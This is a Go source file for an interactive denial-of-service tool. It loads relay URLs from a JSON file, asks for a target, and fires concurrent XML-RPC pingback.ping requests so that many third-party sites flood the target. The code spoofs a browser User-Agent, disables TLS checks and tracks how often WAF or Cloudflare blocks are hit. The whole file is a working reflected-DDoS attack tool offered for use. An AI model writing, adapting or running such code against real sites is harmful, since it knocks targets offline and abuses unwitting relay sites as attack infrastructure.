package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

var Banner = `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣽⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣷⣶⣦⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⡿⠿⠛⠛⠛⠻⢦⣤⣹⡲⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⡋⠀⠀⠀⣶⡄⠀⠀⣰⣦⠙⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⣧⠀⠀⠀⣿⣞⢀⣀⣻⡿⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⠀⠈⠉⡅⠀⠀⢀⠌⢽⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣀⠤⠤⠬⠵⠶⠥⠤⠬⢀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⠔⠻⡁⢠⣠⢤⣴⡒⠒⠒⢒⢴⠀⡜⠁⢀⡦⣲⡾⠹⣤⣀⢠
⠀⠀⠀⠀⠀⢾⣧⠖⣒⣥⠀⡏⠀⢀⢠⠀⠀⢸⡄⢠⢻⢹⣿⠃⣿⠀⠀⣜⢯⡭
⠀⠀⠀⢀⢀⣰⢿⣅⣀⡜⡇⢹⢣⡾⡜⡾⡾⢾⡇⢹⠘⠘⠛⠧⠘⠷⠚⠉⠐⠂
⠀⠀⣶⢿⠹⡽⣑⣿⣍⠀⢰⡀⡄⠁⠁⠀⠀⣸⠧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡀⠸⣿⡈⠷⣷⠂⠈⣿⡄⠀⡅⠵⠤⠄⠀⠀⠛⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠮⡄⡉⡛⡖⠈⠀⠀⠘⠓⣖⡳⠖⡻⢻⣷⡒⠞⣍⣉⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠁⠉⠁⠀⠀⢀⣾⣾⠏⡪⢵⠁⠀⠹⣗⡴⠉⠈⣦⡀⠀⢀⡀⢤⣄⣀⡀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⣿⡙⠳⣾⡧⠀⠀⠀⣿⣀⣠⠞⠉⣳⠆⠁⡠⠔⣉⡬⡷⠁
⠀⠀⠀⠀⠀⡴⢻⣿⠃⢉⠞⠛⠀⠀⠀⠀⠈⠛⢿⣶⡔⠁⡠⢊⣴⢾⢻⡝⠁⠀
⠀⠀⠀⠀⢰⡇⠀⠉⠛⠉⡇⠀⠀⠀⠀⠀⠀⠀⠀⢻⢀⣼⣷⣿⣙⡤⠋⠀⠀⠀
⠀⠀⠀⠀⢸⡇⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⠯⠟⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⠆⣐⣶⡿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠐⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`
var (
	Error           int
	WafOrAccessLock int
	Relay           int
	Request         int
	mu              sync.Mutex
	wg              sync.WaitGroup
	Paused          bool
)

var stopStats = make(chan bool, 1)

const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Orange = "\033[38;5;208m"
)

type Data struct {
	Relay        string `json:"relay"`
	ArticleRelay string `json:"article_relay"`
	Target       string `json:"target"`
}

func color(status string) string {
	if status == "True" {
		return "\033[32mTrue\033[0m"
	}
	return "\033[31mFalse\033[0m"
}

func ClearScreen() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	} else {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
}

func dos(Relay string, ArticleRelay string, Target string) {
	Payload := `<?xml version="1.0"?>
	<methodCall>
		<methodName>pingback.ping</methodName>
			<params>
				<param><value><string>%s</string></value></param>
				<param><value><string>%s</string></value></param>
			</params>
	</methodCall>`

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	x := fmt.Sprintf(Payload, Target, ArticleRelay)
	client := &http.Client{Transport: tr}
	req, err := http.NewRequest("POST", Relay, strings.NewReader(x))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0")
	req.Header.Set("Content-Type", "text/xml")
	resp, err := client.Do(req)

	if err != nil {
		log.Fatalf("Request failed: %v", err)
	}

	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	mu.Lock()

	if strings.Contains(string(body), "403 Forbidden") || strings.Contains(string(body), "Just a moment...") {
		WafOrAccessLock++
	} else if strings.Contains(string(body), "faultString") {
		Request++
	} else {
		Error++
	}
	mu.Unlock()
}

func Stats() {
	for {
		if !Paused {
			mu.Lock()
			fmt.Printf("\r\033[KRequest [%s%d%s] WAF/Lock [%s%d%s] Errors [%s%d%s]",
				Green, Request, Reset,
				Orange, WafOrAccessLock, Reset,
				Red, Error, Reset)
			mu.Unlock()
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func main() {

	content, err := ioutil.ReadFile("urls.json")
	if err != nil {
		mu.Lock()
		Error++
		mu.Unlock()
		return
	}

	var Urls []Data
	err = json.Unmarshal(content, &Urls)
	if err != nil {
		log.Fatal("Error during Unmarshal(): ", err)
	}

	go Stats()

	for {
		var (
			Target string
			Leave  string
		)

		Paused = true
		fmt.Print(Banner)
		fmt.Print("Enter Target: ")
		fmt.Scan(&Target)
		ClearScreen()
		fmt.Print(Banner)
		fmt.Printf("Target: %s\n\n", Target)
		Paused = false

		for _, relay := range Urls {
			wg.Add(1)
			go func(r Data) {
				defer wg.Done()
				dos(r.Relay, r.ArticleRelay, Target)
			}(relay)
		}

		wg.Wait()
		time.Sleep(500 * time.Millisecond)
		Paused = true
		fmt.Print("\nDo you want to leave? (y/n): ")
		fmt.Scan(&Leave)

		if Leave == "y" || Leave == "Y" {
			os.Exit(0)
		} else {
			mu.Lock()
			Request = 0
			WafOrAccessLock = 0
			Error = 0
			mu.Unlock()
			ClearScreen()
		}
	}
}
